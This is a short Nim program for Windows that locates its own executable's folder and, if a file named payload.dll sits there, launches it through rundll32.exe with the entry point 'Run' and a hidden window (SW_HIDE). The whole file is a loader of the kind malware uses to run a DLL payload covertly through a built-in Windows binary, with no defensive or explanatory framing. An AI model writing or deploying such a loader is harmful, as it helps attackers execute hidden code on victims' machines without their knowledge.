import winim/lean
import std/os

proc main() =
  var szPath: array[MAX_PATH, char]
  GetModuleFileNameA(0, addr szPath[0], MAX_PATH)
  let currentExe = $cast[cstring](addr szPath[0])
  let currentDir = splitFile(currentExe).dir
  let dllPath = currentDir & "\\payload.dll"

  if not fileExists(dllPath):
    return

  let cmd = "rundll32.exe \"" & dllPath & "\",Run"
  WinExec(cmd.cstring, SW_HIDE)

when isMainModule:
  main()
